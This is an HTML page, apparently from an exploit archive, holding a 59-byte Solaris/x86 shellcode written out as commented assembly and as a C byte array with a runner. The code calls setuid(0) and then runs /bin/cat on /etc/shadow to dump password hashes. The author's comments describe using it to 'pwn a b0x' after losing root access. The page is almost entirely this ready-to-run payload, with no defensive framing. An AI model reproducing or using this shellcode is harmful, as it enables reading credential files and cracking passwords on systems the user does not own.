<html><head><title>Solaris/x86 - setuid(0)&amp;execve(/bin/cat, /etc/shadow)&amp;exit(0) - 59 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
; sm4x 2008
; /bin/cat /etc/shadow
; 59 bytes
; SunOS sol01 5.11 snv_86 i86pc i386 i86pc Solaris
; (port to SunOS to pwn a b0x - thank god for that default __unix__ CRYPT_DEFAULT!!!!)
; this is what happens when ur work takes away root pirv on a SunOS box :-/

global _start
_start:

xor     eax, eax

; --- setuid(0)
push    eax
push    eax
mov     al, 0x17
int     0x91

; --- setup /etc/shadow
jmp     short   load_file
ok:
pop     esi

; setup /bin/cat
push    eax
push    0x7461632f
push    0x6e69622f
mov     ebx, esp

; --- array setup
push    eax     ; null
push    esi     ; /etc/shadow
push    ebx     ; /bin/cat
mov     edx, esp

; -- execve()
push    eax     ; 0
push    edx     ; array { &quot;/bin/cat&quot;, &quot;/etc/shadow&quot;, 0}
push    ebx     ; /bin/cat
mov     al, 0x3b
push    eax
int     0x91

; --- exit
inc	eax
push    eax
push    eax
int     0x91

load_file:
call    ok
db      '/etc/shadow'

*/

#include &quot;stdio.h&quot;

char code[] =  &quot;\x31\xc0\x50\x50\xb0\x17\xcd\x91\xeb\x20&quot;
		&quot;\x5e\x50\x68\x2f\x63\x61\x74\x68\x2f\x62&quot;
		&quot;\x69\x6e\x89\xe3\x50\x56\x53\x89\xe2\x50&quot;
		&quot;\x52\x53\xb0\x3b\x50\xcd\x91\x40\x50\x50&quot;
		&quot;\xcd\x91\xe8\xdb\xff\xff\xff\x2f\x65\x74&quot;
		&quot;\x63\x2f\x73\x68\x61\x64\x6f\x77&quot;;

int main(int argc, char **argv) {
 int (*func)();
 printf(&quot;Bytes: %d\n&quot;, sizeof(code));
 func = (int (*)()) code;
 (int)(*func)();
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
